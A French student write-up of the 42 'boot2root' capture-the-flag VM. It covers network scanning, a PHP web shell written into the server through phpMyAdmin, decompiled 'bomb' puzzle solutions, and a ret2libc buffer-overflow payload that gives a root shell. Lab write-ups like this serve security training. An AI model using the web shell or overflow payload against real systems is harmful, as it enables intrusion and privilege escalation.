# Boot-2-root
## Installation de la VM
On télécharge l'ISO depuis le site de 42. On installe la VM avec virtual box et on y ajoute l'ISO.
À domicile, nous avons eu quelques soucis pour trouver l'IP de la VM. Nous avons dû faire quelques réglages dans Virtual Box.
Une fois tout cela configuré, on lance la VM.

## Trouver l'IP de la VM
Boot2root nous demande un login et un mot de passe que nous ne connaissons pas. Nous allons donc essayer de trouver l'IP de la VM pour y trouver plus d'informations.

On lance donc la commande `ifconfig`, la VM étant censé y figurer. On remarque un `vboxnet0` avec une adresse IP de `192.168.56.1`. Nous utilisons donc `nmap 192.168.56.0-255` afin scanner tout les réseaux entre `192.168.56.0` et `192.168.56.255`. `nmap` nous renvoit :
```
> nmap 192.168.56.0-255
21/tcp open ftp
22/tcp open ssh
80/tcp open http
443/tcp open https
```
On constate que la VM héberge un serveur web avec le port 80.

Afin de référencer les différentes url liées à cette adresse IP nous utilisons DIRB, un scanner de contenu web. DIRB va tester une série de mots clés pour tenter d'y détecter les URL. On install DIRB simplement avec brew.
```
brew install sidaf/pentest/dirb
```
On lance DIRB avec la commande suivante :
```
> ./dirb https://192.168.56.101/ wordlists/common.txt
---- Scanning URL: https://192.168.56.101/ ----
+ https://192.168.56.101/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.56.101/forum/
==> DIRECTORY: https://192.168.56.101/phpmyadmin/
+ https://192.168.56.101/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.56.101/webmail/
```

## Connexion au forum
Avec un navigateur, on se connecte au forum en utilisant l'adresse `https://192.168.56.101/forum`. Le forum contient 3 sujets, donc un qui concerne des problèmes de connexion. Dans le post, on y trouve ce qui semble être des logs de connexion.

On remqrque ici plusieurs choses:
- Il y a un `session_closed(lmezard)` qui nous indique que lmezard s’est connecté.
- Il y a un `Failed password for invalid user !q]Ej?5K5cyAJ`. Ce login ressemble à un mot de passe, comme si l'utilisateur avait tapé son mot de passe dans le champs du nom d'utilisateur.

On tente alors de se connecter au forum avec l'utilisteur `lmezard` et la mot de passe `!q\]Ej?*5K5cy*AJ`. Ça fonctionne !

## Connexion au webmail
Son mail sur le forum est `laurie@borntosec.net`. On tente alors de se connecter sur le webmail avec cette adresse mail et le même mot de passe. Là aussi, ça fonctionne ! On remercie Lmezard qui a eu la bonne idée d’avoir un seul mot de passe.

On voit que Lmezard a reçu un email avec les identifiants et mot de passe pour la base de données.
```
root
Fg-'kKXBj87E:aJ$
```
Ces identifiants nous permettent de nous connecter à phpmyadmin.

## phpmyadmin, injection de code et FTP
Le forum a été créer via MyLittleForum. En cherchant sur internet, on comprend vite qu'il existe de nombreuses failles. Sur le Github d'installation de MyLittleForum, on remarque que le dossier `/var/www/forum/templates_c` nous permet d'avoir les droits d’écritures. L'objectif ici est de créer via phpmyadmin une page php dans ce dossier, et d'y éxecuter du code nous permettant de naviguer sur le serveur.

On éxecute la commande SQL suivante pour y injecter notre page :
```sql
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
INTO OUTFILE '/var/www/forum/templates_c/hacker5.php'
```
La page contient uniquement un input faisant appel à la fonctione `system` de php, nous permettant par example d'éxcuter un `ls`. En naviguant dans le serveur, on y remarque un dossier `LOOKATME` contenant un ficiher `password`. La commande suivante nous permet d'avoir un nom d'utilisateur et un mot de passe pour nous connecter à la VM.
```
cd /home/LOOKATME ; cat password
```
```
lmezard:G!@M6f4Eatau{sF"
```
Ces identifiants nous permettent de nous connecter en FTP avec le port 21.

Pour se connecter en ftp, on utilise filezilla.
On a besoin de `l'hote`, d'un `identifiant`, d'un `mot de passe` et d'un `port`

```
192.168.56.101 lmezard G!@M6f4Eatau{sF" 21
```

## Connexion ssh
Grâce à notre connexion ftp, on remarque qu’on a accès à 2 fichiers :
- Un README contenant `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`.
- fun, qui est une `tarball`.

On commence par `untar` le fichier fun. Un dossier ft_fun apparait.
```
> mv fun fun.tar
> tar -xf fun.tar
> ls
README  ft_fun  fun.tar
```
On utilise la fonction `grep getme *` pour trouver les fichiers contenant la déclaration de la fonction `getme`. Chaque fichier contient un commentaire avec le numéro d'un autre fichier. Exemple :
```c
//file117
```
En faisant un cat sur ce numéro de fichier + 1 on obtient le return de la fonction `getme` correspondante.
```
> grep getme *
0T16C.pcap:char getme4() {
32O0M.pcap:char getme7() {
331ZU.pcap:char getme1() {
4KAOH.pcap:char getme5() {
91CD0.pcap:char getme6() {
B62N4.pcap:char getme3() {
BJPCP.pcap:char getme8() {
BJPCP.pcap:char getme9() {
BJPCP.pcap:char getme10() {
BJPCP.pcap:char getme11() {
BJPCP.pcap:char getme12()
[...]
> cat 331ZU.pcap
char getme1() {

//file5
> grep file6 *
[...]
APM1E.pcap://file6
[...]
> cat APM1E.pcap
	return 'I';

//file6%
```

En répetant cette opération, on obtient :
```
Iheartpwnage
```
Avec un hash sha256, on obtient :
```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
La commande suivante permet de nous connecter à la VM en ssh :
```
ssh -p 22 laurie@192.168.56.101
```

## BOMB
Sur la session de Laurie on trouve un fichier README qui nous affiche ceci :
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
Un exécutable `bomb` est aussi présent. Nous avons téléchargé `Cutter` qui va nous permettre par la suite de décompiler des exécutables. En décompilant le fichier `bomb`, on obtient ceci :
```c
// WARNING: Variable defined which should be unmapped: var_18h
// WARNING: [r2ghidra] Detected overlap for variable var_5h
// WARNING: [r2ghidra] Failed to match type signed int for variable var_4h to Decompiler type: Unknown type identifier
// signed

undefined4 main(char **argv, char **envp)
{
    int32_t iVar1;
    char *s;
    int32_t var_18h;
    
    if (argv == (char **)0x1) {
        _infile = _reloc.stdin;
    } else {
        if (argv != (char **)0x2) {
            printf("Usage: %s [<input_file>]\n", *envp);
    // WARNING: Subroutine does not return
            exit(8);
        }
        _infile = fopen(envp[1], 0x8049620);
        if (_infile == 0) {
            printf("%s: Error: Couldn\'t open %s\n", *envp, envp[1]);
    // WARNING: Subroutine does not return
            exit(8);
        }
    }
    initialize_bomb();
    printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
    printf("only one life good luck !! Have a nice day!\n");
    iVar1 = read_line();
    gcc2_compiled.(iVar1);
    phase_defused();
    printf("Phase 1 defused. How about the next one?\n");
    iVar1 = read_line();
    phase_2(iVar1);
    phase_defused();
    printf("That\'s number 2.  Keep going!\n");
    iVar1 = read_line();
    phase_3(iVar1);
    phase_defused();
    printf("Halfway there!\n");
    s = (char *)read_line();
    phase_4(s);
    phase_defused();
    printf("So you got that one.  Try this one.\n");
    iVar1 = read_line();
    phase_5(iVar1);
    phase_defused();
    printf("Good work!  On to the next...\n");
    iVar1 = read_line();
    phase_6(iVar1);
    phase_defused();
    return 0;
}
```
On remarque qu'il y a 6 phases.

### Phase 1.
La fonction `gcc2_compiled` nous révèle ceci :
```c
void gcc2_compiled.(int32_t arg_8h)
{
    int32_t iVar1;
    
    iVar1 = strings_not_equal(arg_8h, (int32_t)"Public speaking is very easy.");
    if (iVar1 != 0) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    return;
}
```
On voit ici qu'elle fait une comparaison avec la phrase `Public speaking is very easy.` qui est en fait le mot de passse de cette première étape.

### Phase 2
La fonction `phase_2` nous révèle ceci :
```c
void phase_2(int32_t arg_8h)
{
    int32_t iVar1;
    int32_t var_28h;
    int32_t iStack32;
    uint32_t var_18h;
    int32_t aiStack24 [5];
    
    read_six_numbers(arg_8h, (int32_t)&var_18h);
    if (var_18h != 1) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    iVar1 = 1;
    do {
        if (aiStack24[iVar1 + -1] != (iVar1 + 1) * (&iStack32)[iVar1]) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        iVar1 = iVar1 + 1;
    } while (iVar1 < 6);
    return;
}
```
En interprétant le code, et selon le `README` :
- Le mot de passe contient 6 chiffres.
- Le deuxième chiffre est 2.

Le mot de passe est la suite factorielle `1 2 6 24 120 720`.

### Phase 3
La fonction `phase_3` nous révèle ceci :
```c
void phase_3(int32_t arg_8h)
{
    int32_t iVar1;
    char cVar2;
    int32_t var_18h;
    uint32_t var_ch;
    char var_5h;
    uint32_t var_4h;
    
    iVar1 = sscanf(arg_8h, "%d %c %d", &var_ch, &var_5h, &var_4h);
    if (iVar1 < 3) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    // switch table (8 cases) at 0x80497e8
    switch(var_ch) {
    case 0:
        cVar2 = 'q';
        if (var_4h != 0x309) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 1:
        cVar2 = 'b';
        if (var_4h != 0xd6) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 2:
        cVar2 = 'b';
        if (var_4h != 0x2f3) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 3:
        cVar2 = 'k';
        if (var_4h != 0xfb) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 4:
        cVar2 = 'o';
        if (var_4h != 0xa0) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 5:
        cVar2 = 't';
        if (var_4h != 0x1ca) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 6:
        cVar2 = 'v';
        if (var_4h != 0x30c) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    case 7:
        cVar2 = 'b';
        if (var_4h != 0x20c) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        break;
    default:
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    if (cVar2 == var_5h) {
        return;
    }
    // WARNING: Subroutine does not return
    explode_bomb();
}
```
Selon le `README`, le deuxième caractère est un `b`. `var_ch`, qui représente le premier caractère, doit forcément être `1`, `2`, ou `7` selon le `switch`. Ainsi on trouve 3 solutions possibles :
```
1 b 214
2 b 755
7 b 524
```

### Phase 4
La fonction `phase_4` nous révèle ceci :
```c
void phase_4(char *s)
{
    int32_t iVar1;
    int32_t var_4h;
    
    iVar1 = sscanf(s, 0x8049808, &var_4h);
    if ((iVar1 == 1) && (0 < var_4h)) {
        iVar1 = func4(var_4h);
        if (iVar1 != 0x37) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        return;
    }
    // WARNING: Subroutine does not return
    explode_bomb();
}
```
Le code semble faire allusion à la suite de Fibonacci. `0x37` correspond à 55, le neuvième nombre de la suite de Fibonnaci. Le mot de passe est donc `9`.

### Phase 5
La fonction `phase_5` nous révèle ceci :
```c
void phase_5(int32_t arg_8h)
{
    int32_t iVar1;
    int32_t var_18h;
    int32_t var_8h;
    int32_t var_2h;
    
    iVar1 = string_length(arg_8h);
    if (iVar1 != 6) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    iVar1 = 0;
    do {
        *(char *)((int32_t)&var_8h + iVar1) = str.isrveawhobpnutfg[(char)(*(uint8_t *)(iVar1 + arg_8h) & 0xf)];
        iVar1 = iVar1 + 1;
    } while (iVar1 < 6);
    var_2h._0_1_ = 0;
    iVar1 = strings_not_equal((int32_t)&var_8h, (int32_t)"giants");
    if (iVar1 != 0) {
    // WARNING: Subroutine does not return
        explode_bomb();
    }
    return;
}
```
`str.isrveawhobpnutfg` correspond à une chaine de caractère `isrveawhobpnutfg`. On remarque que la fonction va chercher une lettre dans cette chaine a partir d'un index calculé, et le compare au mot `giants`. Nous avons créé un petit script Python qui nous permet de calculer, pour chaque lettre de l'alphabet, l'index dans lequel la fonction va chercher la lettre à comparer (voir phase5.py).

Le mot de passe est donc `opekma`.

> Notre script nous indique que le mot de passe est `opekma`. Or, il semblerait qu'il y ai deux solutions possibles ici, `opekma` et `opekmq`.

### Phase 6
La fonction `phase_6` nous révèle ceci :
```c
void phase_6(int32_t arg_8h)
{
    code *pcVar1;
    int32_t iVar2;
    code *pcVar3;
    int32_t iVar4;
    int32_t var_58h;
    int32_t var_3ch;
    int32_t var_38h;
    int32_t var_34h;
    int32_t var_30h;
    code *apcStack48 [5];
    int32_t var_18h;
    int32_t aiStack24 [5];
    
    read_six_numbers(arg_8h, (int32_t)&var_18h);
    iVar4 = 0;
    do {
        if (5 < aiStack24[iVar4 + -1] - 1U) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        iVar2 = iVar4 + 1;
        if (iVar2 < 6) {
            do {
                if ((&var_18h)[iVar4] == (&var_18h)[iVar2]) {
    // WARNING: Subroutine does not return
                    explode_bomb();
                }
                iVar2 = iVar2 + 1;
            } while (iVar2 < 6);
        }
        iVar4 = iVar4 + 1;
    } while (iVar4 < 6);
    iVar4 = 0;
    do {
        pcVar3 = node1;
        iVar2 = 1;
        if (1 < (&var_18h)[iVar4]) {
            do {
                pcVar3 = *(code **)(pcVar3 + 8);
                iVar2 = iVar2 + 1;
            } while (iVar2 < (&var_18h)[iVar4]);
        }
        apcStack48[iVar4 + -1] = pcVar3;
        iVar4 = iVar4 + 1;
    } while (iVar4 < 6);
    iVar4 = 1;
    pcVar3 = (code *)var_30h;
    do {
        pcVar1 = apcStack48[iVar4 + -1];
        *(code **)(pcVar3 + 8) = pcVar1;
        iVar4 = iVar4 + 1;
        pcVar3 = pcVar1;
    } while (iVar4 < 6);
    *(undefined4 *)(pcVar1 + 8) = 0;
    iVar4 = 0;
    do {
        if (*(int32_t *)var_30h < **(int32_t **)(var_30h + 8)) {
    // WARNING: Subroutine does not return
            explode_bomb();
        }
        var_30h = *(int32_t *)(var_30h + 8);
        iVar4 = iVar4 + 1;
    } while (iVar4 < 5);
    return;
}
```
Le code est plus complèxe icc, mais les premières lignes nous permettent de comprendre deux choses :
- Le mot de passe contient 6 chiffres.
- Les chiffres sont compris entre 1 et 6.

Les combinaisons sont assez faibles. On créer donc un petit script Python pour calculer toutes les combinaisons possibles qui s'arrête lorsque la bombe est désamorcée (voir brutforce.py). On obtient donc le code `426315`.

La bombe est désamorcée.

En assemblant l'ensemble des mots de passe obtenus, on obtient donc ceci :
```
Publicspeakingisveryeasy.126241207201b2149opekma426315
```

> Après quelques recherches sur le StackOverflow 42, on découvre qu'il faut inverser le `3` et le `1` de la phase 6.
> De plus, il semblerait que le sujet ne prenne pas en comtpe les deux possibilités de la phase 5. Il faut donc assembler `opekmq` et non `opekma`.
>
> Le mot de passe final est donc `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

On peut donc se connecter en ssh avec l'utiliseur thor :
```
ssh -p 22 thor@192.168.56.101
```
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Turtle et zaz
En arrivant sur le compte de `thor`, on remarque :
- Un fichier `turtle` qui contitent des instructions similaires au language LOGO.
- Un README qui contient : `Finish this challenge and use the result as password for 'zaz' user.`
 
 On retire les mots inutiles aux instructions du fichier `turtle` et on les exécute sur [ce site](http://lwh.free.fr/pages/prog/logo/logo.htm). Avec le dessin nous montre les lettres `SLASH`.
 
 À la fin du fichier `turtle`, il était indiqué de hasher ce mot. Le hash `md5` s'avère être la bonne solution. On obtient :
 ```
 646da671ca01bb5d84dbb5fb2238dc8e
 ```
On peut ainsi se connecter avec l'utilisateur zaz en ssh :
```
ssh -p 22 zaz@192.168.56.101
```

## Root
En arrivant sur le compte de `zaz`, on remarque un exécutable `exploit_me`. En le décompilant, on obtient ce résultat :
```c
bool main(char **argv, char **envp)
{
    undefined auStack144 [140];
    
    if (1 < (int32_t)argv) {
        strcpy(auStack144, envp[1]);
        puts(auStack144);
    }
    return (int32_t)argv < 2;
}
```
Le programme est très simple : il affiche sur l'entrée standard le premier argument reçu en ligne de commande. Néanmoins, on remarque que le programme alloue un buffer de 140 octets et copie l'argument dedans. Si notre agrument excède 140 charactère, le progamme `SEGFAULT`.

Nous allons donc exploiter ce `SEGFAULT` avec la faille `Ret2libc`.

### Adressage
Pour éxcuter notre shell, nous avons besoin de trouver l'adresse de la fonction `system` et de la chaine `"/bin/sh"`. Le but étant de faire un call à `system` avec ce paramètre. Pour cela, on exécute `gdb` sur notre exécutable avec les commandes suivante :
```
> gdb exploit_me
[...]
> (gdb) break main
[...]
> (gdb) run
[...]
```

#### system

```
> (gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```
L'adresse de `system` est `0xb7e6b060`.

#### /bin/sh

```
> (gdb) find __libc_start_main,+99999999,"/bin/sh"
[...]
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

Si on regarde dans cette addresse, on voit bien que c'est /bin/sh

```
> (gdb) x/s 0xb7f8cc58
[...]
0xb7f8cc58:	 "/bin/sh"
```
L'adresse de `"/bin/sh"` est `0xb7f8cc58`.

## Stack
Lors d'un appel à une fonction, la stack ressemble à ceci :
```
[...]
[function parameter 2]
[function parameter 1]
[function ret]
---------------------- EBP
[local variable]
[local variable]
---------------------- ESP
```
Notre but est de faire ressembler la stack à ceci, pour exécuter la fonction `system` avec notre `"/bin/sh"`.
```
[...]
[/bin/sh]       // system function argument
[system ret]    // system return address
[system]        // system call
---------------------- EBP
[buffer[140]]
---------------------- ESP
```
Avant de remplir notre buffer, notre stack est semblable à celle ci dessous :
```
[...]
[reg]
[reg]
---------------------- EBP
[buffer[140]]
---------------------- ESP
```
En remplissant plus de 140 octets dans notre buffer, nous somme capable d'écrire dans les registres suivants. Nous pouvons donc créer un buffer qui, avec un overflow, écrira nos instructions `system` dans les registres suivants. Nous devons suivre ce schéma :
```
[ Buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]
```
Cette commande Perl permet de générer notre buffer :
```perl
perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'
```
En exécutant la commande suivante, on est capable de lancer un shell avec les droits administrateur :
```
./exploit_me `perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'`
```
